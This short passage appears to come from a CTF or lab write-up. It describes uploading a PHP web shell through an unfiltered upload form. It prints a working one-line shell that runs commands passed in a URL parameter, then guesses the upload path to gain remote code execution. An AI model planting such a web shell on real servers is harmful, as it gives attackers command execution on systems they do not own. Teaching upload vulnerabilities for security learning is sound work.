2. Uploading a PHP Shell

Since there’s no filtering, we upload a classic one-liner PHP web shell (<?php system($_GET['cmd']); ?>) as syndro.php. The server replies “Upload successful!” → we guess the path /uploads/syndro.php and get instant RCE.
